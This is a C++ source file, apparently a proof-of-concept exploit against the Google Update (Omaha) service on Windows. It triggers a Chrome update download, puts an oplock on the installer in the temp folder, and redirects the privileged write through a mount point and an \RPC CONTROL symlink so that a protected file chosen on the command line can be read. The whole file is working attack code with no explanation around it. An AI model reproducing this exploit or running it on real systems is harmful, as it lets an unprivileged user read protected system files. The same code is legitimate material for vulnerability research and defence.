// GoogleOmaha.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <windows.h>
#include <iostream>
#include <sddl.h>
#include <shlobj.h>
#include <tchar.h>
#include <conio.h>
#include <pathcch.h>
#include <Shlwapi.h>
#include "google_update_idl_h.h"
#include "Win-Ops-Master.h"

#pragma comment(lib, "Pathcch.lib")
#pragma comment(lib, "Shlwapi.lib")

using namespace std;

GUID Chrome_GUI = { 0x8a1d4361,0x2c08,0x4700,{0xa3,0x51,0x3e,0xaa,0x9c,0xbf,0xf5,0xe4} };
HANDLE htarget;
wstring target;
OpsMaster op;
std::wstring _BuildNativePath(std::wstring path) {
    //I am considering any path that start with \ is a native path
    if (path.rfind(L"\\", 0) != std::wstring::npos)
        return path;
    path = L"\\??\\" + path;
    return path;
}
void RemoveDirNotParent(wstring dir) {
    std::wstring search_path = std::wstring(dir) + L"\\*.*";
    std::wstring s_p = std::wstring(dir) + std::wstring(L"\\");
    WIN32_FIND_DATA fd;
    HANDLE hFind = FindFirstFile(search_path.c_str(), &fd);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                if (wcscmp(fd.cFileName, L".") != 0 && wcscmp(fd.cFileName, L"..") != 0)
                {
                    op.RRemoveDirectory(s_p + fd.cFileName);
                }
            }
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) {
                _wrmdir(std::wstring(s_p + fd.cFileName).c_str());
            }
            else {
                DeleteFile((s_p + fd.cFileName).c_str());
            }
        } while (FindNextFile(hFind, &fd));
        FindClose(hFind);
    }
}

void callback() {

    op.MoveFileToTempDir(htarget, USE_SYSTEM_TEMP_DIR);
    wchar_t _tmp[MAX_PATH];
    ExpandEnvironmentStringsW(L"%TMP%", _tmp, MAX_PATH);
    RemoveDirNotParent(_tmp);
    wstring sm = L"\\RPC CONTROL\\" + target;
    op.CreateMountPoint(wstring(_tmp), wstring(L"\\RPC CONTROL\\"));
    int argc = 0;
    LPWSTR* cmdline = CommandLineToArgvW(GetCommandLine(), &argc);
    op.CreateNativeSymlink(wstring(sm), _BuildNativePath(cmdline[1]));
}

DWORD WINAPI worker(void*) {
    
    wchar_t download_path[MAX_PATH];
    ExpandEnvironmentStrings(L"%ProgramFiles(x86)%\\Google\\Update\\Download", download_path, MAX_PATH);
    HANDLE hdir = op.OpenDirectory(download_path, GENERIC_READ, ALL_SHARING);
    FILE_NOTIFY_INFORMATION* fn;
    char buff[4096];
    DWORD btsret = 0;
    ReadDirectoryChangesW(hdir, buff, sizeof(buff) - sizeof(WCHAR), TRUE,
        FILE_NOTIFY_CHANGE_SIZE,//find the newly created file
        &btsret, NULL, NULL);
    fn = (FILE_NOTIFY_INFORMATION*)buff;
    size_t sz = fn->FileNameLength / sizeof(WCHAR);
    fn->FileName[sz] = L'\0';//add the null termination char
    wstring disfile = download_path + wstring(L"\\");
    disfile.append(fn->FileName);
    HANDLE _htarget = NULL;

    wchar_t current_exe_dir[MAX_PATH];
    GetModuleFileName(GetModuleHandle(NULL), current_exe_dir, MAX_PATH);
    PathCchRemoveFileSpec(current_exe_dir, MAX_PATH);
    wstring _target = current_exe_dir + wstring(L"\\");
    int argc = 0;
    LPWSTR* cmdline = CommandLineToArgvW(GetCommandLine(), &argc);
    _target.append(PathFindFileName(cmdline[1]));
    //copy the file
    while (!CopyFile(disfile.c_str(), _target.c_str(), FALSE)) {}
    return ERROR_SUCCESS;
}

int main(int argc, char* argv[])
{
    if (argc != 2) {
        cout << "[#] Usage : " << argv[0] << " C:\\Path\\To\\Read";
        return 0;
    }
    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);//change current process priority to high

    CoInitialize(NULL);

    IGoogleUpdate3Web* upd = NULL;
    
    HRESULT hr = CoCreateInstance(Chrome_GUI, NULL, CLSCTX_LOCAL_SERVER, __uuidof(upd),
        reinterpret_cast<void**>(&upd));
    if (FAILED(hr)) {
        _tprintf(_T("CoCreateInstance Failed 0x%8.8x\r\n"), hr);
        return 1;
    }
    IAppBundleWeb* app_bundle;

    IDispatch* disp;
    hr = upd->createAppBundleWeb(&disp);

    if (FAILED(hr)) {
        _tprintf(_T("IAppBundleWeb->createAppBundleWeb Failed 0x%8.8x\r\n"), hr);
        return 1;
    }

    hr = disp->QueryInterface(__uuidof(app_bundle), reinterpret_cast<void**>(&app_bundle));

    if (FAILED(hr)) {
        _tprintf(_T("IDispatch->QueryInterface Failed 0x%8.8x\r\n"), hr);
        return 1;
    }

    CoSetProxyBlanket(app_bundle,
        RPC_C_AUTHN_DEFAULT,
        RPC_C_AUTHZ_DEFAULT,
        COLE_DEFAULT_PRINCIPAL,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        nullptr,
        EOAC_DYNAMIC_CLOAKING);//allow impersonation if disallowed


    hr = app_bundle->initialize();

    if (FAILED(hr)) {
        _tprintf(_T("IAppBundleWeb->initialize Failed 0x%8.8x\r\n"), hr);
        return 1;
    }

    app_bundle->createInstalledApp(
        SysAllocString(L"{8A69D345-D564-463c-AFF1-A69D9E530F96}")//well known guid for google chrome
    );

    if (FAILED(hr)) {
        _tprintf(_T("IAppBundleWeb->createInstalledApp Failed 0x%8.8x\r\n"), hr);
        return 1;
    }

    hr = app_bundle->checkForUpdate();

    if (FAILED(hr)) {
        _tprintf(_T("IAppBundleWeb->checkForUpdate Failed 0x%8.8x\r\n"), hr);
        return 1;
    }

    wchar_t _tmp[MAX_PATH];
    ExpandEnvironmentStringsW(L"%TMP%", _tmp, MAX_PATH);
    op.DeleteMountPoint(wstring(_tmp));//just in case
    RemoveDirNotParent(_tmp);
    DWORD tid = 0;
    HANDLE hworker = CreateThread(NULL, NULL, worker, NULL, NULL, &tid);

    Sleep(5000);

    hr = app_bundle->download();
    if (FAILED(hr)) {
        _tprintf(_T("IAppBundleWeb->download Failed 0x%8.8x\r\n"), hr);
        return 1;
    }

    HANDLE hsrch = NULL;
    wstring file_to_search = wstring(_tmp) + L"\\*_chrome_installer.exe";
    WIN32_FIND_DATA _data = { 0 };
    do {
        FindClose(hsrch);
        //look for the newly created file
        hsrch = FindFirstFile(file_to_search.c_str(), &_data);
    } while (hsrch == INVALID_HANDLE_VALUE);
    FindClose(hsrch);
    target = _data.cFileName;
    wstring chrome_file = _tmp + wstring(L"\\" + target);
    //open it and oplock it
    do {
        htarget = op.OpenFileNative(chrome_file, GENERIC_READ | DELETE, NULL, OPEN_EXISTING);
    } while (!htarget);

    op.CreateAndWaitLock(htarget, callback);

    WaitForSingleObject(hworker, INFINITE);
    CloseHandle(hworker);
    return 0;
}